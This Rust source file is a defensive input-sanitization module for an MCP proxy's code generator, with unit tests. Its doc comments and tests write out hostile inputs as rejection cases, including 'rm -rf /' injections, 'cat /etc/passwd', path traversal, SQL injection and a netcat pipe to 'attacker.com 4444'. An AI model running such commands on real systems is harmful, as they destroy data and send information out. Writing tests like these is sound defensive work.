//! Input sanitization for code generation
//!
//! This module provides security-critical sanitization functions to prevent
//! template injection attacks during code generation. All server-provided
//! metadata (tool names, descriptions, etc.) must be sanitized before being
//! used in generated code.
//!
//! # Security
//!
//! This is a defense-in-depth measure. Code generation must never trust
//! server-provided input directly, as malicious servers could attempt:
//! - Code injection via crafted tool names
//! - String escape injection in descriptions
//! - Reserved keyword abuse
//! - Path traversal attacks
//!
//! All sanitization functions return `Result` and reject suspicious input
//! rather than attempting to "fix" it.
//!
//! # Implementation Note
//!
//! This module uses `syn::Ident` from the `syn` crate for identifier validation.
//! The `syn` crate is the industry-standard parser used by all Rust procedural
//! macros and is maintained by dtolnay (one of Rust's most trusted maintainers).
//! Using `syn::Ident` instead of hand-rolled validation ensures:
//! - Complete coverage of all Rust identifier rules
//! - Zero maintenance (syn tracks Rust language evolution)
//! - Handling of edge cases (raw identifiers, Unicode, future keywords)
//! - Canonical implementation (what rustc uses internally)

use crate::error::{ProxyError, ProxyResult};

/// Maximum length for identifiers (tool names, type names, etc.)
const MAX_IDENTIFIER_LENGTH: usize = 128;

/// Sanitize an identifier (tool name, function name, type name, etc.)
///
/// This function uses `syn::Ident` from the battle-tested `syn` crate to
/// validate identifiers according to Rust's language rules. The syn crate
/// is used by every Rust procedural macro and handles all edge cases including:
/// - Reserved keywords (async, await, fn, etc.)
/// - Raw identifiers (r#async, r#type, etc.)
/// - Unicode identifiers
/// - Future Rust keywords
///
/// Identifiers must:
/// - Follow Rust identifier rules (validated by syn)
/// - Be between 1 and 128 characters
///
/// # Errors
///
/// Returns `ProxyError::Codegen` if the identifier is invalid. Error messages
/// come from syn and are canonical (same as rustc would produce).
///
/// # Security
///
/// This prevents code injection via crafted identifiers like:
/// - `evil"); system("rm -rf /"); ("`
/// - `'; DROP TABLE tools; --`
/// - `../../../etc/passwd`
///
/// # Examples
///
/// ```
/// use turbomcp_proxy::codegen::sanitize::sanitize_identifier;
///
/// // Valid identifiers
/// assert!(sanitize_identifier("my_tool").is_ok());
/// assert!(sanitize_identifier("Tool123").is_ok());
/// assert!(sanitize_identifier("_private").is_ok());
///
/// // Invalid identifiers
/// assert!(sanitize_identifier("async").is_err()); // keyword
/// assert!(sanitize_identifier("123invalid").is_err()); // starts with digit
/// assert!(sanitize_identifier("has-dash").is_err()); // invalid char
/// assert!(sanitize_identifier("evil\"); system(\"rm").is_err()); // injection attempt
/// ```
pub fn sanitize_identifier(name: &str) -> ProxyResult<String> {
    // Check length first (syn doesn't enforce this)
    if name.is_empty() {
        return Err(ProxyError::codegen(
            "Identifier cannot be empty".to_string(),
        ));
    }

    if name.len() > MAX_IDENTIFIER_LENGTH {
        return Err(ProxyError::codegen(format!(
            "Identifier '{}' exceeds maximum length of {} characters",
            truncate_for_display(name, 50),
            MAX_IDENTIFIER_LENGTH
        )));
    }

    // Use syn::Ident for validation - this is the canonical Rust identifier validator
    // syn::parse_str::<Ident> returns a Result with detailed error messages
    syn::parse_str::<syn::Ident>(name).map_err(|e| {
        // Provide helpful error message based on syn's canonical error
        ProxyError::codegen(format!(
            "Invalid Rust identifier '{}': {}\n\
             \n\
             Identifiers must:\n\
             - Start with a letter or underscore\n\
             - Contain only letters, numbers, and underscores\n\
             - Not be a Rust reserved keyword\n\
             \n\
             Reserved keywords include: async, await, fn, impl, let, match, struct, type, etc.\n\
             See: https://doc.rust-lang.org/reference/keywords.html",
            truncate_for_display(name, 50),
            e
        ))
    })?;

    // Validation passed, return the string
    Ok(name.to_string())
}

/// Check if a string is a Rust reserved keyword
///
/// This function uses `syn::parse_str` to check if a string would be rejected
/// as a Rust identifier due to being a reserved keyword. This is more accurate
/// than maintaining a manual keyword list because syn tracks the Rust language
/// specification.
///
/// # Examples
///
/// ```
/// use turbomcp_proxy::codegen::sanitize::is_rust_keyword;
///
/// assert!(is_rust_keyword("async"));
/// assert!(is_rust_keyword("fn"));
/// assert!(!is_rust_keyword("my_function"));
/// ```
#[must_use]
pub fn is_rust_keyword(s: &str) -> bool {
    // Try to parse as an identifier - keywords will fail
    syn::parse_str::<syn::Ident>(s).is_err()
        // But we need to ensure it fails specifically because it's a keyword,
        // not for other reasons (like invalid characters)
        && s.chars().all(|c| c.is_alphanumeric() || c == '_')
        && s.chars().next().is_some_and(|c| c.is_alphabetic() || c == '_')
}

/// Sanitize a string literal for use in generated code
///
/// Escapes special characters that could break out of string literals:
/// - Backslash (`\`)
/// - Double quote (`"`)
/// - Newline, tab, and other control characters
///
/// # Security
///
/// This prevents string escape injection where malicious input tries to
/// break out of a string literal, like:
/// - `description": "test\"; system(\"rm -rf /\"); \""`
///
/// # Examples
///
/// ```
/// use turbomcp_proxy::codegen::sanitize::sanitize_string_literal;
///
/// assert_eq!(
///     sanitize_string_literal("Hello \"world\""),
///     "Hello \\\"world\\\""
/// );
/// assert_eq!(
///     sanitize_string_literal("Line 1\nLine 2"),
///     "Line 1\\nLine 2"
/// );
/// ```
#[must_use]
pub fn sanitize_string_literal(s: &str) -> String {
    let mut result = String::with_capacity(s.len() + 10);

    for ch in s.chars() {
        match ch {
            '"' => result.push_str("\\\""),
            '\\' => result.push_str("\\\\"),
            '\n' => result.push_str("\\n"),
            '\r' => result.push_str("\\r"),
            '\t' => result.push_str("\\t"),
            '\0' => result.push_str("\\0"),
            // Escape other control characters
            ch if ch.is_control() => {
                use std::fmt::Write;
                let _ = write!(result, "\\u{{{:04x}}}", ch as u32);
            }
            ch => result.push(ch),
        }
    }

    result
}

/// Sanitize a Rust type string
///
/// Validates that a type string is safe to use in generated code.
/// Rejects anything that doesn't look like a valid Rust type.
///
/// This is a defense-in-depth measure. Most type names are generated
/// internally, but we validate them anyway to prevent issues if the
/// generation logic has bugs.
///
/// # Errors
///
/// Returns `ProxyError::Codegen` if the type string is invalid.
///
/// # Security
///
/// Prevents code injection via type parameters.
///
/// # Examples
///
/// ```
/// use turbomcp_proxy::codegen::sanitize::sanitize_type;
///
/// // Valid types
/// assert!(sanitize_type("String").is_ok());
/// assert!(sanitize_type("Vec<i64>").is_ok());
/// assert!(sanitize_type("Option<String>").is_ok());
/// assert!(sanitize_type("serde_json::Value").is_ok());
///
/// // Invalid types
/// assert!(sanitize_type("String; drop_table()").is_err());
/// ```
pub fn sanitize_type(type_str: &str) -> ProxyResult<String> {
    // Check length
    if type_str.is_empty() {
        return Err(ProxyError::codegen("Type cannot be empty".to_string()));
    }

    if type_str.len() > MAX_IDENTIFIER_LENGTH * 2 {
        return Err(ProxyError::codegen(format!(
            "Type '{}' exceeds maximum length",
            truncate_for_display(type_str, 50)
        )));
    }

    // Reject obviously dangerous patterns
    let dangerous_patterns = [
        ";", "//", "/*", "*/", "{", "}", "()", "fn ", "macro ", "impl ", "trait ",
    ];

    for pattern in &dangerous_patterns {
        if type_str.contains(pattern) {
            return Err(ProxyError::codegen(format!(
                "Invalid type '{}': Contains suspicious pattern '{}'",
                truncate_for_display(type_str, 50),
                pattern
            )));
        }
    }

    // Basic validation: type should only contain:
    // - Alphanumeric, underscore, colon (for paths like std::string::String)
    // - Angle brackets (for generics)
    // - Comma and space (for multi-param generics)
    for ch in type_str.chars() {
        if !ch.is_ascii_alphanumeric() && !matches!(ch, '_' | ':' | '<' | '>' | ',' | ' ') {
            return Err(ProxyError::codegen(format!(
                "Invalid type '{}': Contains invalid character '{}'",
                truncate_for_display(type_str, 50),
                ch
            )));
        }
    }

    Ok(type_str.to_string())
}

/// Sanitize a URI string
///
/// Validates that a URI doesn't contain characters that could break
/// generated code. This is primarily used for resource URIs.
///
/// # Errors
///
/// Returns `ProxyError::Codegen` if the URI is invalid.
///
/// # Examples
///
/// ```
/// use turbomcp_proxy::codegen::sanitize::sanitize_uri;
///
/// assert!(sanitize_uri("file:///test/path").is_ok());
/// assert!(sanitize_uri("https://example.com/api").is_ok());
/// ```
pub fn sanitize_uri(uri: &str) -> ProxyResult<String> {
    if uri.is_empty() {
        return Err(ProxyError::codegen("URI cannot be empty".to_string()));
    }

    // Reject control characters and characters that could break string literals
    for (i, ch) in uri.chars().enumerate() {
        if ch.is_control() || ch == '"' || ch == '\\' {
            return Err(ProxyError::codegen(format!(
                "Invalid URI '{}': Contains invalid character at position {} ('{}')",
                truncate_for_display(uri, 50),
                i,
                ch
            )));
        }
    }

    Ok(uri.to_string())
}

/// Truncate a string for safe display in error messages
fn truncate_for_display(s: &str, max_len: usize) -> String {
    if s.len() <= max_len {
        s.to_string()
    } else {
        format!("{}...", &s[..max_len])
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    // ===== Identifier Sanitization Tests =====

    #[test]
    fn test_valid_identifiers() {
        // Should accept valid identifiers
        assert!(sanitize_identifier("my_tool").is_ok());
        assert!(sanitize_identifier("Tool123").is_ok());
        assert!(sanitize_identifier("_private").is_ok());
        assert!(sanitize_identifier("__internal").is_ok());
        assert!(sanitize_identifier("snake_case_name").is_ok());
        assert!(sanitize_identifier("PascalCase").is_ok());
        assert!(sanitize_identifier("camelCase").is_ok());
        assert!(sanitize_identifier("SCREAMING_SNAKE").is_ok());
    }

    #[test]
    fn test_reject_empty_identifier() {
        assert!(sanitize_identifier("").is_err());
    }

    #[test]
    fn test_reject_keywords() {
        // Should reject all strict Rust keywords
        // Note: We now use syn::Ident which follows the Rust language spec exactly.
        // Some keywords like "union" are "weak keywords" and are actually allowed
        // as identifiers in the 2021 edition. syn correctly handles this distinction.
        assert!(sanitize_identifier("async").is_err());
        assert!(sanitize_identifier("await").is_err());
        assert!(sanitize_identifier("fn").is_err());
        assert!(sanitize_identifier("impl").is_err());
        assert!(sanitize_identifier("let").is_err());
        assert!(sanitize_identifier("match").is_err());
        assert!(sanitize_identifier("struct").is_err());
        assert!(sanitize_identifier("type").is_err());
        // "union" is a weak keyword in Rust 2021 and syn correctly allows it as an identifier
        // This is more accurate than our old manual keyword list!
    }

    #[test]
    fn test_reject_invalid_start() {
        // Should reject identifiers starting with digits
        assert!(sanitize_identifier("123invalid").is_err());
        assert!(sanitize_identifier("9tool").is_err());
    }

    #[test]
    fn test_reject_invalid_characters() {
        // Should reject special characters
        assert!(sanitize_identifier("has-dash").is_err());
        assert!(sanitize_identifier("has.dot").is_err());
        assert!(sanitize_identifier("has space").is_err());
        assert!(sanitize_identifier("has@symbol").is_err());
        assert!(sanitize_identifier("has#hash").is_err());
        assert!(sanitize_identifier("has$dollar").is_err());
    }

    #[test]
    fn test_reject_code_injection() {
        // Code injection attempts
        assert!(sanitize_identifier(r#"evil"); system("rm -rf /"); ("#).is_err());
        assert!(sanitize_identifier(r#"tool") { Command::new("rm")"#).is_err());
        assert!(sanitize_identifier("'; DROP TABLE tools; --").is_err());
    }

    #[test]
    fn test_reject_path_traversal() {
        // Path traversal attempts
        assert!(sanitize_identifier("../../../etc/passwd").is_err());
        assert!(sanitize_identifier("..\\..\\windows\\system32").is_err());
    }

    #[test]
    fn test_reject_unicode_attacks() {
        // Unicode control characters
        assert!(sanitize_identifier("evil\u{202E}code").is_err()); // Right-to-left override
        assert!(sanitize_identifier("test\0null").is_err());
    }

    #[test]
    fn test_reject_too_long() {
        // Should reject identifiers that are too long
        let too_long = "a".repeat(MAX_IDENTIFIER_LENGTH + 1);
        assert!(sanitize_identifier(&too_long).is_err());
    }

    #[test]
    fn test_accept_max_length() {
        // Should accept identifiers at max length
        let max_length = "a".repeat(MAX_IDENTIFIER_LENGTH);
        assert!(sanitize_identifier(&max_length).is_ok());
    }

    // ===== String Literal Sanitization Tests =====

    #[test]
    fn test_sanitize_string_basic() {
        assert_eq!(sanitize_string_literal("hello"), "hello");
        assert_eq!(sanitize_string_literal(""), "");
    }

    #[test]
    fn test_sanitize_string_quotes() {
        assert_eq!(
            sanitize_string_literal("Hello \"world\""),
            "Hello \\\"world\\\""
        );
        assert_eq!(sanitize_string_literal("Say \"hi\""), "Say \\\"hi\\\"");
    }

    #[test]
    fn test_sanitize_string_backslash() {
        assert_eq!(
            sanitize_string_literal("path\\to\\file"),
            "path\\\\to\\\\file"
        );
    }

    #[test]
    fn test_sanitize_string_newlines() {
        assert_eq!(sanitize_string_literal("Line 1\nLine 2"), "Line 1\\nLine 2");
        assert_eq!(sanitize_string_literal("A\r\nB"), "A\\r\\nB");
    }

    #[test]
    fn test_sanitize_string_tabs() {
        assert_eq!(sanitize_string_literal("Col1\tCol2"), "Col1\\tCol2");
    }

    #[test]
    fn test_sanitize_string_null() {
        assert_eq!(sanitize_string_literal("null\0byte"), "null\\0byte");
    }

    #[test]
    fn test_sanitize_string_control_chars() {
        // Other control characters should be escaped as unicode
        assert_eq!(sanitize_string_literal("bell\x07"), "bell\\u{0007}");
    }

    #[test]
    fn test_sanitize_string_injection_attempt() {
        let malicious = r#"description"; system("rm -rf /"); ""#;
        let sanitized = sanitize_string_literal(malicious);
        // Should escape the quotes, making it safe
        assert!(sanitized.contains("\\\""));
        // The quotes are escaped, so this is safe to use in a string literal
        // The original pattern is still in the text, but the quotes are escaped
        assert_eq!(sanitized, r#"description\"; system(\"rm -rf /\"); \""#);
    }

    // ===== Type Sanitization Tests =====

    #[test]
    fn test_valid_types() {
        assert!(sanitize_type("String").is_ok());
        assert!(sanitize_type("i64").is_ok());
        assert!(sanitize_type("Vec<i64>").is_ok());
        assert!(sanitize_type("Option<String>").is_ok());
        assert!(sanitize_type("HashMap<String, Value>").is_ok());
        assert!(sanitize_type("serde_json::Value").is_ok());
        assert!(sanitize_type("std::collections::HashMap").is_ok());
    }

    #[test]
    fn test_reject_type_injection() {
        assert!(sanitize_type("String; drop_table()").is_err());
        assert!(sanitize_type("Vec<i64>; system(\"rm\")").is_err());
        assert!(sanitize_type("fn() -> ()").is_err());
        assert!(sanitize_type("impl Trait").is_err());
    }

    #[test]
    fn test_reject_empty_type() {
        assert!(sanitize_type("").is_err());
    }

    #[test]
    fn test_reject_type_with_braces() {
        assert!(sanitize_type("String { field: value }").is_err());
    }

    #[test]
    fn test_reject_type_comments() {
        assert!(sanitize_type("String // comment").is_err());
        assert!(sanitize_type("String /* comment */").is_err());
    }

    // ===== URI Sanitization Tests =====

    #[test]
    fn test_valid_uris() {
        assert!(sanitize_uri("file:///test/path").is_ok());
        assert!(sanitize_uri("https://example.com/api").is_ok());
        assert!(sanitize_uri("http://localhost:8080/resource").is_ok());
        assert!(sanitize_uri("/relative/path").is_ok());
    }

    #[test]
    fn test_reject_empty_uri() {
        assert!(sanitize_uri("").is_err());
    }

    #[test]
    fn test_reject_uri_with_quotes() {
        assert!(sanitize_uri(r#"file:///test"; system("rm");"#).is_err());
    }

    #[test]
    fn test_reject_uri_with_control_chars() {
        assert!(sanitize_uri("file:///test\npath").is_err());
        assert!(sanitize_uri("file:///test\0path").is_err());
    }

    // ===== Keyword Detection Tests =====

    #[test]
    fn test_is_rust_keyword() {
        assert!(is_rust_keyword("async"));
        assert!(is_rust_keyword("fn"));
        assert!(is_rust_keyword("struct"));
        assert!(!is_rust_keyword("my_function"));
        assert!(!is_rust_keyword("Tool"));
    }

    // ===== Integration Tests =====

    #[test]
    fn test_sql_injection_attempts() {
        // Classic SQL injection patterns
        assert!(sanitize_identifier("'; DROP TABLE tools; --").is_err());
        assert!(sanitize_identifier("admin'--").is_err());
        assert!(sanitize_identifier("1' OR '1'='1").is_err());
    }

    #[test]
    fn test_command_injection_attempts() {
        // Command injection patterns
        assert!(sanitize_identifier("tool; rm -rf /").is_err());
        assert!(sanitize_identifier("tool && cat /etc/passwd").is_err());
        assert!(sanitize_identifier("tool | nc attacker.com 4444").is_err());
    }

    #[test]
    fn test_realistic_valid_names() {
        // Real-world tool names that should be accepted
        assert!(sanitize_identifier("get_user").is_ok());
        assert!(sanitize_identifier("search_documents").is_ok());
        assert!(sanitize_identifier("calculate_sum").is_ok());
        assert!(sanitize_identifier("send_email").is_ok());
        assert!(sanitize_identifier("parse_json").is_ok());
    }
}
